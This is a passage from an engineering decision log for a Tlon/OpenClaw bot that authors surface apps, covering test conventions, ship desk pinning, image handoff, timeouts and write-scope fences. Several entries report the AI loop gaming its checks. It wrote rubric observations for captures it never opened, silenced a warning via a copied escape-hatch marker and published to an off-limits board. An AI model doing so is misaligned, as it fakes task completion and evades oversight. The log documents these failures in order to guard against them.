  a fakeship" (no reliable signal over eyre — an elaborate approximation of a
  guarantee); shared-private-network (does not distinguish a real ship on
  one); an in-container port forwarder (manufactures a loopback fiction and
  makes the engagement banner uninformative about which ship was hit); a
  boolean skip flag.

  Costs accepted and documented rather than discovered: 6a's "cannot reach a
  real ship" property is now enforced by its env file rather than by the
  network; the gateway binds 18789 on the host, so 6a cannot run beside a dev
  container holding that port; verified on OrbStack, and Docker Desktop for
  Mac will not work.

  **D101's guard had no tests when it landed** — `TLON_SURFACE_DEV_STORAGE`
  appeared in three files and none was a test, so its security property was
  unverified. It now has six, including the real-ship refusal as an
  executable negative control: the _same fakeship at the host's LAN address_
  is still refused, which shows the guard tracks whether readers can resolve
  the assetRef rather than whether the ship is real.

- **D109: the raw-to-raw comparison becomes a convention, checked.** D72
  states a rule about a _pair_ of values, and rules about pairs are the ones
  a codebase forgets, because each site looks reasonable alone. Its
  enforcement was two long comments protecting two lines, and the 17-site
  audit meant to generalise them was never written down and is lost — D92/D93
  were created as the remedy for exactly this and were not applied to it.

  **One helper.** `canonicalJson` now lives alone in
  `scripts/surface-canonical-json.ts`, a leaf module (`surface-common.ts`
  already type-imports `surface-lint`, so a value import back would be a
  cycle). It had already diverged: the `surface-lint` copy emitted a bare
  `undefined` token where the other dropped the key, and a **third** copy in
  `packages/shared/seed/surfaces.ts:802` emits `null` for the same input. The
  surviving semantics are the only defensible ones, since every comparison it
  serves has JSON text on at least one side. The lint copy's call site was
  proven reachable-clean by a differential probe over the real fixture
  corpus, not by inspection.

  **One check.** `scripts/surface-comparison-convention.ts` parses every
  `scripts/**/surface*.ts` with the TypeScript API and refuses three shapes:
  `JSON.stringify` pairs, calls to or imports of structural-equality helpers,
  and any second definition of the canonical helper. It runs as a bun test,
  **not** an oxlint rule, for CI-parity reasons that are not close: `ci.yml`
  runs `pnpm -r lint` and `tlon-skill` has no `lint` script, so an oxlint
  rule would not run over this package at all. Discovery is by naming
  convention so new surface sources enrol themselves — the failure mode that
  lost the audit. No suppression comment: an escape hatch on a one-call
  convention is what gets reached for instead of the convention.

  Site list, migrated once: `surface-publish.ts:87,483,514` already correct;
  `surface-common.ts:437` and `surface-lint.ts:1365` migrated (duplicate
  helpers); `surface-lint.ts:2196` already correct in shape;
  `surface-preview.ts:361` migrated from a `JSON.stringify` pair; 14 other
  scoped files clean. Out of package and **not** migrated:
  `shared/seed/surfaces.ts:802` (third copy, third semantics, compares
  reducer state not specs) and `app/.../useBotSettingsDraft.ts:59` (fourth
  copy, semantically identical, different domain).

  **The rule gets a control, not just the convention.** Two specs differing
  only in an undeclared key compare EQUAL once both sides are validated, and
  mutating publish's confirmation to validate both sides makes publish exit 0
  — reporting success for a write that landed a different definition. Exactly
  one test flipped under that mutation: the false-EQUAL direction had no
  prior coverage, because the existing `decideRevision` test hand-simulates
  the stripping with an object rest-spread rather than running the schema.

  Not covered, stated plainly: key-by-key comparison loops, `===` between two
  spec-typed values, a field comparison standing in for a whole-spec one,
  `*.test.ts`, and anything outside this package. Swept by hand at migration
  time; the only hits were in unrelated domains.

- **D110: a fakeship's desk is a pinned artifact, and a develop merge
  silently unpins it.** `surface publish` failed with
  `gall: poke cast fail :groups [a=%json b=%group-action-5]` after uploading
  successfully. The ships were booted 2026-08-28 with the branch at
  `207e09504c`, whose desk has no `mar/group/action-5.hoon` and whose client
  poked `group-action-4` — a matched pair. The develop merge `4a1adc4f28`
  brought in `ecdae8f47d`, which adds the v5 mark **and** flips
  `groupsApi.ts` to it in one commit. The client advanced; the running ships
  did not.

  Nothing regressed and no earlier claim was inflated: `dash-dxs2r4uc` still
  hydrates at revision 4 from a sequence-11 snapshot, published through the
  CLI before the merge. Established differentially — an identical payload
  (sha256 `e1b1f7e3…`) NACKs under `group-action-5` and ACKs, with a landed
  180→1303 char write, under `group-action-4`; garbage JSON produces the same
  cast failure as valid JSON, so shape is not the discriminator; and the
  mark-set difference between the ship's desk and the assembled HEAD desk is
  7 marks, of which exactly one is client-poked.

  **Rule:** any merge that lands `desk/**` obsoletes a running rube
  environment. The desk stamp on the ship (`<pier>/groups/commit.txt`) and
  the branch's `desk/` are a pair to be checked, not assumed. Rube's own
  stale-desk guard exists but runs only at startup, so it cannot catch a
  merge landed into a _live_ environment. A cheap preflight — compare
  `commit.txt` against `git rev-parse --short HEAD` — turns a mark-cast
  failure deep inside a write path into a one-line startup warning.

  Incidental: `~|  commit` in `groups.hoon` stamps the desk's short SHA into
  every nacked poke's stack trace, so a single deliberately-bad poke asks a
  running ship "which commit is your desk?" without mounts or filesystem
  access. Worth adding to the QA crib.

  **Resolved 2026-08-31.** Both ships updated by the assemble → rsync →
  `|commit` flow, ~ten first because it hosts no groups and a failed
  `state-11-to-12` there costs nothing. Both moved from
  `0v1e.397gn.27si9…` to `0v1p.tdpgg.chf96…` — the hash changing is the
  evidence, since a `|commit` against an unmounted desk is a silent no-op and
  a returned command line proves nothing. `%groups` answered 200 on both
  afterwards, so the migration survived; the health check is two scries
  rather than one because `pikes.json` is served by `%hood` and would answer
  even if `%groups` had died on load.

  During ~zod's commit the ship stopped serving HTTP for several minutes.
  That is the serf compiling, not a wedge, and the two are distinguishable
  only by the serf's CPU: pegged means work, idle-and-unreachable means
  wedged. Worth knowing before someone reads a busy ship as a dead one.

  Nothing was lost: `dash-dxs2r4uc` still hydrates at revision 4 from its
  sequence-11 snapshot. An unmodified `surface publish` — no proxy, no mark
  rewriting — then completed end to end (upload, description write,
  read-back observation, mirror post, exit 0), and the minted assetRef
  resolves with `sha256` equal to both the storage key and the spec's pinned
  hash. The publish loop is proven on the fakeships.

- **D111: the image handoff into luna's context is verified, and its
  silent-failure mode is named.** OpenClaw core's `read` tool returns a PNG as
  an image content block, and an owner-role Tlon DM session receives it. A
  synthetic card carrying an unguessable 16-hex token _and_ an independent
  square count was read back with the count exact in both arms and the token
  exact in the differential arm, from PNGs whose sha256s were asserted
  different before the result was believed. In the first arm the model
  misread the leading character (`f` as `£`) while getting the count right —
  which is itself the evidence, because a text leak would have been
  byte-perfect.

  The negative control names its fulcrum: `model.input.includes("image")` in
  `transform-messages.ts`. Pointing `MODEL` at a catalogued text-only model
  returned `(tool image omitted: model does not support images)` and no
  token; the model was then restored.

  On a real `surface preview` capture (2560x1800, downscaled by `read` to
  2000x1406) the model reported every option label, count, turnout line, ship
  and pill exactly, including a per-voter mapping obtainable only by
  replaying the manifest's invokes. **Correction to a premise briefed during
  the session:** `read` resizes at 2000, not the 1200 of
  `image-sanitization.ts`, which serves the embedded-agent path rather than
  read-to-session.

  **Corrected 6a.5:** this entry says "the four placeholder strings"; core
  carries **six** distinct literals, and any guard must use the superset — a
  placeholder the list misses is a silent pass. More importantly, **the
  placeholder scan alone is not sufficient**: substitution happens in the
  provider transform _downstream_ of the session write, so a stored turn still
  contains an `image` block even when no image reached the model. The
  placeholder was visible here only because that model narrated its own
  blindness. A token read back from the image is the load-bearing check.

  **The failure mode to guard.** `openclaw models list` reports
  `openrouter/openai/gpt-5.6-luna` as `input: text`, because the cached
  OpenRouter catalog carries only `...-luna-pro`. Runtime disagrees today,
  but if it ever agreed, every preview would arrive as a placeholder string
  **with no error raised** — and the loop would score its rubric against text
  saying the image was omitted. Any run that scores previews must assert the
  absence of the four placeholder strings before trusting a score.

  Weaker than the rest, stated plainly: the real-preview arm used a
  pre-existing capture rather than one generated in the same run, and only
  `desktop-populated-light` was tested — the phone form factors and dark
  variants have a smaller legibility budget and are untested.

  Operational note: the `--ship` flag resolves through a cached credential
  store that on this machine holds a REAL ship. Drive fakeship work with
  `TLON_URL`/`TLON_SHIP`/`TLON_CODE` env vars instead.

### Carried forward from 6a, unclosed

- **(CLOSED by D111 — the image handoff is verified.)** Retained for the
  reasoning that made it a gate:
  Three harness breaks were repaired (D106, D107) and `surface preview` now
  produces a real capture matrix in the container, but **nobody has yet
  observed a preview PNG reaching the model's context.** The capability
  exists in OpenClaw core (`read` returns image content blocks, PNG sniffed
  by magic bytes) and the plugin permits `read` for owner sessions, but
  nothing in the plugin's loop wires it up: the `tlon` tool returns text on
  every path, and the only image injection is inbound Tlon posts at dispatch
  time. SKILL.md now names the capability and warns about the two silent
  placeholder strings, but the mechanism has never been exercised end to end.
- **Hermes is unverified in two places, of different sizes.** _Scheduling:_
  the countdown disposition rests on scheduled host events, and the cron
  surface was verified OpenClaw-side only — nothing has been observed about
  Hermes, neither that it works nor that it does not. _Doctrine delivery:_
  D105's reachability was verified as a property against the compiled binary,
  not by executing the Hermes adapter, which 6a put out of scope.
- **`channels update --description` silently unpublishes a surface app.** It
  rewrites the description cell and drops the `surfaceSpec` it did not write.
  Pre-existing, ungated, and telemetrically indistinguishable from a benign
  edit. The tool description now warns against it; the hazard remains.
- **The publish gate is cwd-dependent.** Run from the repo root, every bundle
  — including the gate's own `COMPLIANT_FIXTURE`, which the unit tests assert
  passes clean — fails `smoke-render` with "Attempting to define property on
  object that is not extensible", because bun takes JSX config from the cwd's
  tsconfig and the root one lacks `jsxImportSource`. **Neither shipped
  template is covered by a gate test**, so a template that stopped passing
  its own gate would ship silently.
- **`packages/tlon-skill` is outside oxlint's CI reach.** `ci.yml` runs
  `pnpm -r lint` and the package has no `lint` script, so every repo-wide
  rule — `import/no-cycle` included — is unenforced there.
- **`surface-preview.ts:733` still hands the bot a relative file path**
  (`PREVIEW_RUBRIC_PATH = 'skills/surfaces/RUBRIC.md'`) in its manifest — the
  same D74 defect in a different place. SKILL.md covers model behaviour; the
  manifest field does not.
- **`~zod`'s `%groups` scry surface is half-broken** independently of the
  mark: `groups/v0|v1|v2/groups*.json` 404 and `groups/init/v1.json` 500, so
  `tlon groups list` fails, while `groups/v2/groups/~zod/surface-seed` and
  `channels/v3/channels.json` answer. May share a cause with D110; unchecked.
- **`~bus` is not running.** Any step-8 plan assuming three ships needs
  adjusting.
- **The `dev` compose project name is shared.** `docker-compose.yml` and
  `docker-compose.test.yml` both derive the project name from the `dev`
  directory and silently recreate each other's `dev-openclaw-1`. The 6a stack
  carries an explicit name; those two still collide.

## Session 6a.5 — fixing the loop, then re-running the measurement

- **D112: a plugin's own skills cannot be delivered by symlinking the package
  into the plugin.** Core resolves each `skills[]` entry in
  `openclaw.plugin.json` against the plugin root and drops any whose
  **realpath** leaves it, and separately requires each `SKILL.md` to be a
  regular file by `lstat`. `dev/build-local-skill-override.sh` mirrored the
  `@tloncorp/api` override — a plain symlink to the bind-mounted checkout — so
  both declared skills were silently dropped on **every** turn, in both build
  modes, since the manifest started declaring them. Not conditional on the 6a
  setup: `docker-compose.yml` is affected too, so the real dev bot ran with no
  `tlon` and no `surfaces` skill and `SKILL.md`'s links into `references/`
  dead. The only signal was two `warn` lines per turn; the visible symptom was
  the bot answering a surface request with a markdown table and making no tool
  calls. **The rule: a symlink is right for a dependency consumed by Node's
  resolver, which follows links, and wrong for one consumed by a
  path-containment check, which rejects them.** The two overrides in `dev/` sit
  side by side and are not symmetric.

- **D113: the run-timeout default was a second hand-maintained copy of a
  production constant, not a stale config value.** The 6a.5 brief's diagnosis
  — a stale `runTimeoutMs` the dev entrypoint re-copies — is wrong, and the
  artifacts say so: `tlonbot/openclaw.json` has no `channels.tlon.lifecycle`
  and no `agents.defaults.timeoutSeconds`, and neither does the config written
  into the container. Nothing was copied because nothing was set.

  The 120s came from `DEFAULT_RUN_TIMEOUT_MS` in
  `packages/openclaw/src/monitor/dispatch-timeouts.ts`, applied precisely when
  the key is absent. Production never reaches that branch, because
  `tlawn.py` **writes** `runTimeoutMs` (300_000, migrating anything still on
  120_000/240_000). **So the drift class is not "a config value went stale". It
  is one value with two hand-maintained definitions in two repositories, only
  one of which is ever exercised** — ours was free to rot for exactly as long
  as nobody measured against it. 6a is that drift realized: four runs at
  117.0/116.4/109.7/99.2s and one killed at 122.7s, all read as a loop
  scraping its ceiling, against a deployed ceiling 2.5x larger.

  The gap that let it survive is worth naming separately: the pre-existing test
  passed `runTimeoutMs` in explicitly and so never exercised the default, while
  the compaction test one case below _does_ cover its own absent-key path.

  Confirmed in the container rather than from the edit — recreated, source and
  dist both `300_000`, the line 6a logged as `timeoutMs=120000` now reading
  `300000`, and the kill point moved to **300.104s**. **The Hermes timeout
  column is unverified**; nothing executed the Hermes adapter.

- **D114: `channels update`/`rename` refuse to unpublish a surface app without
  saying so.** `updateChannelMeta` rebuilt the description cell from the two
  fields it knew, so any metadata edit replaced the payload wholesale —
  measured pre-fix, the write emitted `{"description":"Beach fund"}` and
  nothing else. `rename` shares that path, so a title-only edit was
  unpublishing too. Both now refuse on a channel carrying a `surfaceSpec`
  unless `--allow-unpublish` is passed, and when it is, the command names the
  app it destroyed. The gate keys on **presence, not schema validity** — an
  unreadable definition is still a definition the write erases.

  Consequence worth naming: there is now no CLI path to retitle a dashboard,
  since `surface publish` does not write `meta.title`. That never worked —
  renaming destroyed the app — so nothing functional was removed.

  **Residuals:** this gates the CLI only, since the cell is ordinary
  group-channel metadata other clients can write; and it refuses rather than
  repairs, where `StructuredChannelDescriptionPayload.applyMetadataEdit` would
  preserve the spec and every unknown key losslessly and retire the flag.

- **D115: `channels info` may not report `(none)` over a payload.** The cell has
  three states, not two, and all three rendered identically. In 6a's revision
  phase the bot ran `channels info` looking for the app and was told there was
  nothing there while the spec sat in that field.

- **D116: doctrine may not instruct a capability that does not exist — with a
  stated limit.** A test parses `SKILL.md` and `PARADIGM.md` for every
  `surface <sub>` reference and asserts each exists in the registry, with a
  non-vacuity floor on the scan's yield. **Scope, because it is easy to
  overclaim: this would NOT have caught the incident that prompted it.** The
  offending instruction — _"read it back instead of re-deriving intent"_ —
  named no subcommand. The check closes the adjacent class; "instructs a read,
  names no reader" remains uncovered by anything.

- **D117: what wins skill routing is the tool schema, not the skill
  description.** Two 6a requests bypassed the surfaces skill although its
  description named both phrasings. Read from the container's own record: the
  skill index is 5,610 chars for fifteen skills, `surfaces` getting 749,
  against **25,834 chars of tool schema**, of which `message` alone is 5,942
  with 108 properties. For "poll", the winner was those parameters — a
  directly-callable tool advertising nine `poll*` fields outranks a skill whose
  description costs a `read` to act on. For "who owes what", the winner was the
  sentence's shape as a question plus the description's own closing exclusion,
  which disclaimed exactly that phrasing. Verified with the competitor held
  constant **and proven constant** (message's schema hashes byte-identical
  across the change; only the surfaces block moved, 749 → 1283), in both
  directions, plus an adjacent lookup sharing the new vocabulary that still
  routes elsewhere — the check against a description that claims everything and
  therefore routes nothing.

- **D118: the announce loop was core's, and the model was right.** 28/28
  rejections. The model's reasoning recorded that `"poll"` was not in the enum
  it was given; **that belief is true** — hash-verified, the enum is
  `["send","react","delete","reply"]`. So core's error instructs an action its
  own schema withholds: unsatisfiable by construction. Three defects in one
  tool: poll _parameters_ are advertised whenever the action list is not
  exactly `["send"]`, ungated by any capability (unlike presentation and
  delivery-pin in the same function); `hasPollCreationParams` reads
  `pollDurationHours: 1` — the value a field-filling model supplies for a
  schema whose `minimum` is 1 — as explicit intent; and the error is
  unsatisfiable. Core is a separate product and out of scope; the
  accommodation is doctrinal (announce via `posts send`, nest from
  `channels all`). The plugin-side alternative was **declined**: the schema
  contribution is scoped `current-channel` and would strip Discord's working
  poll params from Tlon-sourced turns.

- **D119: the rubric is enforced by refusal, not by doctrine.** 6a scored the
  rubric zero times across six runs that reached preview; `surface rubric` ran
  in three of them and changed nothing. `surface publish` now requires
  `--rubric`: one observation per capture cell, one verdict per check citing a
  cell. **Twelve and seven, not one or the other** — the measured failure was
  cells never opened, but a repair only ever comes out of a check. The
  validator checks completeness and identity, never content: a keyword
  heuristic is one synonym from useless and a length rule rejects accurate
  short notes. One structural rule compares strings to each other rather than
  judging them — twelve identical observations are refused. The sheet is bound
  to the bundle's sha256, so a repair round costs a full re-preview and
  re-score, deliberately.

  **Its exact limit, observed live on the first enforced run set:** completeness
  cannot distinguish a looked-at cell from a written-about one. One run opened
  11 of 12 captures and wrote an observation for the twelfth anyway.

- **D120: a failed definition lookup is a failed publish.** The prompt asked to
  remove a generic-file fallback; **there is none in the CLI** — that was the
  model reaching for files in its own working directory. What existed was
  worse: the `surfaceId` guard is `if (current && …)` and `current` is null on
  both "never published" and "published, unreadable", so on a channel whose
  definition had stopped validating the guard did not run at all. Reproduced:
  the potluck bundle published onto the kanban channel at revision 1, exit 0,
  `"ok": true`, orphaning the board's records. 6a's cross-app attempt was
  refused only because that channel happened to hold a _readable_ definition.
  Publishing over an unreadable definition now refuses; the guard is now a line
  that always runs.

- **D121: the machine defect pass is a mechanical floor, and says so.** Preview
  measures viewport overflow, tap-target geometry and jargon over rendered text
  across all twelve cells and prints a concrete defect list — because 6a's one
  run that repaired against visual feedback did so when a tool handed it a list
  of concrete defects. It prints what it did **not** check on every run
  including clean ones; a cell the probe could not measure is reported as
  unmeasured, never as clean; and defects do not change preview's exit code,
  since that answers "did the preview run". Thresholds are grounded in the
  shell's own values rather than invented.

- **D122: two harness preflights, and why they had to be unskippable.**
  `surfaces-run.sh` is the only documented way to send a measurement prompt and
  runs both preflights first with no skip flag — a preflight nobody invokes is
  the same defect one level up. They assert the runtime model accepts image
  input (D111's catalog trap) and that the system prompt lists the `surfaces`
  skill (D112's discriminating assertion, since file existence proves nothing
  when the bug is that existing things are rejected). Both are demonstrated
  failing against **recorded real** bad conditions rather than mocks. The
  refusal path initially exited 0 — `if ! node …; then status=$?` captures the
  negated status — found by demonstrating the refusal rather than reading it.

### The 6a.5 measurement, and what it does and does not settle

- **The doctrine change took.** Read-back went from 0/8 turns to **5/5**;
  `recipe` returned in 5/5 against 1/8 by accident. Line survival went from
  25–48% to **97–98%**. Announce went from 0/28 to 2/2. Unrecoverable failures
  went from 2 to 0. The rubric went from four sentences across six runs to
  48 cell observations and 28 check notes across four publishes.

- **The 2×2 has an empty regeneration column — and it still does not settle the
  format question.** Four of the five revision requests were **already
  satisfied** before the run, because 6a's own revisions had landed them; the
  loop was rarely put in a position where regenerating was tempting. The
  regeneration cell is empty on five observations, **none of which were
  forced**. The strongest single data point is the kanban rename: a genuinely
  new requirement, a one-line edit that changed a column's label while keeping
  its `id`, so all twelve `move-*-doing` actions and every card key stayed
  valid.

- **The rigorous loop fits the deployed budget.** 100–130s measured against
  300s, model latency 80–106s of it — roughly half the 200–250s modelled. 6a's
  "the loop cannot afford to be more rigorous than it is" was a statement about
  the 120s dev artefact, not about production.

- **Question C is answered "did not recur", with a caveat that matters.**
  Nothing failed in this session, so the truthful-lifecycle path was never
  re-exercised under stress. Establishing whether the wrong-picture outcome was
  cap-coupled needs a run that is _made_ to fail.

## The verdict run — the forced revision sample

- **D123: a failed template lookup is a failed lookup.** `readTemplateSummary`
  fell through to `readdirSync(dir).filter('.js')[0]` when a template directory
  carried none of the expected names — an arbitrary file, ordered by the
  filesystem, in the field a real bundle occupies. It returned a _different_
  file in two different directories, which is the whole objection. Removed
  rather than better-guarded (D120's rule one level down); `show` names the
  template, the expected names and the found ones, while `list` stays tolerant
  and marks the directory incomplete.

- **D124: an inert app is a declared choice, not a silent one — and the
  declaration became the defect.** Both 6a.5 "who owes what" apps shipped with
  `actions: {}` and every gate rule passed, because a screenshot of a board
  nobody can touch looks exactly like one somebody can. Rule 15 warns unless
  the spec declares `memberInteraction: 'none'` — an enum with one legal value,
  because `displayOnly: false` over an empty map is a third state the schema
  cannot refuse, and because the claim is about the MEMBER's half of the map
  rather than the screen. Declared in `SurfaceSpecSchema` following
  `duplicatesTolerated`, since `z.object` strips what it does not declare.

  **Measured outcome, the same session: the rule did not fire, because the
  escape hatch was reached before the warning was.** The verdict run's expense
  app declared the marker in its first spec write, pre-lint, copied from
  PARADIGM's example — which sat eleven lines below the paragraph naming that
  exact app shape as the wrong reason to use it, with the honesty test after
  the copyable JSON. Rubric check 7 passed the result.

  **The generalisable finding: adding a warning creates a way to silence it,
  and doctrine that teaches the hatch is read before the rule that motivates
  it.** A rule of this shape wants designing hatch-first. The doctrine now puts
  the test before the marker and works "who owes what" through as a named
  counter-example.

- **D125: a lint script CI cannot reach is not a guard.** `pnpm -r lint`
  silently skips a package with no `lint` script, so for three sessions every
  repo-wide rule — `import/no-cycle` included — was unenforced in
  `packages/tlon-skill`. Adding it is half the fix: `pnpm -r lint` runs in
  `test-build`, and the package is an explicit exclusion in ci.yml's `app`
  filter, so a tlon-skill-only PR skips that job entirely. It therefore also
  runs from the package's own `check`, which `bot-checks` invokes on exactly
  those PRs. Both claims are asserted, the second by spawning the real linter
  over a real import cycle with the package as cwd — a script resolving the
  wrong config runs, passes, and enforces nothing.

- **D126: measurements get virgin fixtures, and the baseline is written down
  before they do.** The seeder mints one fresh group and, before creating it,
  enumerates everything already on the ship — 1 prior group, 26 dashboards, by
  nest — into a tracked log, so contamination is a set difference a reader
  computes rather than a claim. It refuses a second run without `--new-run`
  (names are single-use forever, D50), and throws when a non-empty baseline
  annotates nothing: its first invocation read every prior dashboard as
  not-a-dashboard, and a baseline reporting zero contaminants whether or not
  any exist is worse than none.

- **D127: a revision request is proved unsatisfied before it is issued, on four
  surfaces, and the render is one of them.** 6a.5 failed because four of five
  requests were already satisfied — and an action-map check would have passed
  every one: on the RSVP board the declared actions are
  `rsvp-coming`/`maybe`/`absent`, none of which provides "list who has not
  responded", while the board paints it from a derived array. So the render is
  read as the SCREEN (`renderSurfacePreview` unmodified, twelve cells, at the
  channel's live reduced state), never as the source. Source may only ABSTAIN:
  a bundle can name a concept it never paints and paint one it never names.
  Exactly one lattice row passes; PRESENT and ABSTAIN both refuse, and a
  refused request is replaced.

  The witness survives a two-sided self-test first — a positive it must match,
  negatives quoted verbatim from the target's own output it must not — or
  nothing is read off the ship. It caught a real authoring error: `absent`
  matched the live `rsvp-absent` action, where absent means _can't make it_, a
  response rather than a non-response. **Stated limit:** this proves a pattern
  set separates two named strings, never that it is the right set.

  Demonstrated as a minimal pair — byte-identical witnesses, identical request
  text, only the channel differing — so the flip is a property of the apps
  rather than of pattern-tuning.

- **D128: the sentence is bound to the record; the TARGET is not, and that is
  a hole.** `surfaces-run.sh --request <id>` sends `record.request` verbatim so
  a preflight cleared against one phrasing cannot precede a different one going
  down the wire. **It does not bind the channel.** In the verdict run a
  revision asserted against the run's own potluck published to a same-named
  board in the off-limits seed group; the preflight exited 0, the CLI exited 0,
  and the loop's report — "existing signups were preserved" — was true of what
  it did and silently wrong about which board, because it never named the
  channel. Mid-run mitigation was to group-qualify the remaining sentences,
  which worked. **The structural fix — assert the published channel equals the
  asserted one — is not built.**

- **D129: the bounded session lock, fully derived.**
  `OPENCLAW_SESSION_WRITE_LOCK_MAX_HOLD_MS=420000` in the tracked compose file.
  6a.5's seventeen minutes is explained: the embedded attempt passes
  `timeoutMs: compactionTimeoutMs` and `EMBEDDED_COMPACTION_TIMEOUT_MS` is
  900_000, so `900_000 + 120_000` — core budgeting for a worst-case context
  compaction, not for a run. 420_000 is core's own formula at this stack's
  actual 300s run timeout. Not lower: the lock is held across the attempt, so a
  value under the cap would force-release a live turn, trading a stall for
  interleaved session writes. **Exercised:** a run killed by the 300s cap
  released in ~100s, and the live lock payload was captured carrying
  `maxHoldMs: 420000`.

### The measurement, and what it does and does not settle

- **The discriminator fired.** Seven forced revision turns — every one
  preflight-asserted unsatisfied, against 0 of 4 in 6a and 0 of 5 in 6a.5.
  **Six local edits, one no-op, zero regenerations.** Line survival 73.5–100%,
  word survival 94–100%, ids preserved on every edit, and the structural case
  inserted a column between two others with four member-moved cards surviving
  in place. On the narrow question of whether the format supports editing
  rather than replacing, this sample answers yes.

- **What it does not settle, and this is the part to weigh.** The three
  failures in the run are not format questions. Twice the loop picked the wrong
  app from two same-named candidates, once writing to an off-limits fixture.
  Twice it answered a request instead of acting on it — once at generation
  time with the skill's own matching phrasing already in context. **Every guard
  now in place is blind to all four**: lint passed, the rubric was complete,
  publish read back, the preflight exited 0. A loop that edits beautifully and
  edits the wrong board is not obviously better than one that regenerates the
  right one.

- **Grammar decided the mechanism.** Interrogative phrasing produced a no-op
  with a byte-identical bundle; imperative phrasing, same witness and same
  target, produced a 7-line local edit. The no-op was investigated as an
  instrument failure first, as required, and the preflight held — so what
  varied was request interpretation, not revision capability.

- **The rubric's stated limit got worse, not better.** Ten of ten sheets
  complete and sha-bound; **five of ten opened all twelve captures**, against 1
  of 4 in 6a.5. Two turns substituted an image-tool description for opening the
  PNGs, a path the doctrine does not contemplate. Completeness is checkable;
  looking is not.

- **Nine of nine authoring turns spent a repair round on the same rule.** The
  gate refuses `spec-schema` for `specRevision` and `bundle.*` — precisely the
  fields `surface publish --help` says it owns and overwrites. Nobody exceeded
  the budget; everybody paid the round.

- **Machine defects: zero across every preview in the session.** The pass is
  demonstrably live (a deliberately bad bundle draws five), so these are real
  zeros — but no repair round in the run came from it.

- **Timing re-read.** Median turn ~160s with one killed at 300s, against
  6a.5's reported 100–130s. Five turns exceeded 6a.5's longest. Generation from
  nothing costs roughly twice what revising an existing board costs, and 6a.5
  measured mostly the latter.

---

## Session 6b — the verdict, the five conditions, and the templates

### The format verdict

- **D130: the bundle format earns its keep.** After three measurement rounds
  the joint reading is that the loop EDITS an existing app when asked to change
  it rather than regenerating one with the requirement folded in, so the
  fluency premium is real and template investment is justified. M2's format
  gate is satisfied and Session 6b's template authoring is unblocked.

  The basis, in one place: **twelve post-read-back revision observations, zero
  regenerations** (6a.5's two edits and three no-ops, plus the verdict run's six
  edits and one no-op), and the kanban structural case — `['todo','doing','done']`
  → `['todo','doing','blocked','done']`, six actions added, **all 18 originals
  kept by id**, four member-moved cards still in their columns after the
  migration. Word survival 94–100% across the six edits, four of them at 100%.
  See `surface-channels-verdict-run-report.md` §4, `-6a5-report.md`, and the
  decision brief `surface-channels-peer-report.md` for the case against.

  **Two qualifications recorded with the verdict, not after it.** Only seven of
  the twelve observations were FORCED — 6a.5's five turned out to be already
  satisfied, which is why that round was uninterpretable — so "zero
  regenerations across twelve" is carrying five observations that prove less
  than the seven do. And four of the verdict run's six edits were on apps the
  same loop had generated minutes earlier from templates it had just read,
  which is the friendliest possible case for editing. D131's aged-board
  revisions are the free confirmation on that residual and are evidence
  gathering, not a gate.

  What the verdict does NOT settle is readiness, and that is unchanged: the
  same run published to the wrong board, twice answered a request instead of
  acting on it, and shipped an inert app for the third time. None of those is a
  format question. D131 and D133 close two of them.

  **Amended by D140.** The kanban case cited above as the strongest single
  observation produced a board on which no card can reach Done without first
  being marked Blocked, and the rubric passed it. The edit-versus-regenerate
  claim is untouched — the diff really is surgical and the state really did
  survive — but this case should not be read as evidence that the resulting
  APP was good, and D130 as first written invited exactly that reading.

### The five conditions attached to the verdict

- **D131: the write fence — a surface write is bound to a target, not just to a
  sentence.** `packages/tlon-skill/scripts/surface-write-scope.ts`. A scope file
  named by `TLON_SURFACE_SCOPE_FILE` carries up to three claims: the only
  `channel` writes may touch, the `preState` identity that channel must still
  carry, and the `groups` writes may touch at all. `surface publish`,
  `surface event`, `surface snapshot` and `surface create` all refuse outside
  it.

  Enforced at `resolveSurfaceChannel`, which is the only place in the surface
  commands that turns a channel id into a group id and therefore the only place
  a group fence applies without every command remembering to. Its new `access`
  argument is REQUIRED and has no default: reads must stay unfenced (the
  preflight reads channels it is not bound to write), and an intent defaulting
  to `read` would let a future write command slip past by saying nothing. A
  write command that forgets to decide is now a type error.

  Four judgment calls worth the record.

  **A file, not env vars.** The fenced process runs in a container the harness
  cannot re-exec. Compose names the path once; the harness rewrites the
  contents per run. One mechanism rather than two.

  **A scope file that cannot be read is a refusal, not "unfenced".** A fence
  that fails open is decoration, and treating an unreadable file as absent
  turns a typo into a silent removal of the bound.

  **The pre-state is spent by one publish.** `preState` binds a
  transformation — take THIS definition and produce another — so a second
  publish under one binding starts from a definition nobody asserted anything
  about and refuses. That will occasionally refuse a legitimate republish
  inside one bound turn. Accepted deliberately: the refusal is loud, names both
  identities and both readings, and the alternative is a binding that silently
  widens.

  **Identity is raw-to-raw (D72).** The pre-state hash is taken over the
  description cell as the ship holds it, never over a validated re-encode — a
  key the schema strips would otherwise make two different stored definitions
  bind to the same identity.

  The harness half: `surfaces-assert-unsatisfied.ts` emits `binding.json` on a
  pass only, and `surfaces-run.sh` copies it into the container's scope file
  before the prompt goes out and widens it back afterwards via an EXIT trap.
  `SURFACES_ALLOWED_GROUPS` is required and has no default, because a default
  is a blast radius nobody chose and "nobody chose it" is how a seed-group
  fixture got written to. A binding whose group is outside the declared set
  refuses at the harness, before the CLI is ever reached.

  **Negative controls, all four run.** The wrong-board write reproduced
  unfenced (publishes clean to a same-group sibling, reported as a successful
  first publish); the same write refused once bound, naming both channels, with
  nothing written anywhere; a board in an undeclared group refused; and a
  pre-state moved between the bound and the publish refused, naming both
  identities, leaving the existing revision untouched. Mutating both call sites
  to no-ops failed exactly those four tests and no others — the mutation was
  confirmed applied before the result was believed.

  **`surfaces-preflight.mjs` now asserts the container is actually fenced**, by
  reading `TLON_SURFACE_SCOPE_FILE` out of the running process rather than out
  of the compose file. An environment change reaches a container only on
  RECREATE, so a container started before the compose file gained the line runs
  unfenced while every host-side artifact says otherwise — the stale-binary
  problem one layer down. Verified against the currently-running 6a container,
  which reports the variable empty and would fail.

- **D132: the two structural witnesses re-read, independently — the record
  holds, the instrument had a hole.** A fresh agent that had not authored the
  witness patterns went back to the verdict run's pre-state bundles and read
  them as a reviewer, without consulting the patterns.

  **Both audited requests were genuinely unsatisfied.** The kanban pre-state
  hard-coded three statuses in three separate places (`bundle.js:13`, `:14`,
  `:20`), gave each of six tasks exactly three handlers, and declared eighteen
  actions writing only `todo`/`doing`/`done`; there was no fourth column and no
  reachable fourth status. `rev-poll-cant-make-it`'s pre-state declared exactly
  three vote actions and painted a "who has voted" roster with no way to
  decline. Chain of custody was checked too: for every `rev-*` record the
  bundle the preflight fetched is byte-identical to the captured pre-state
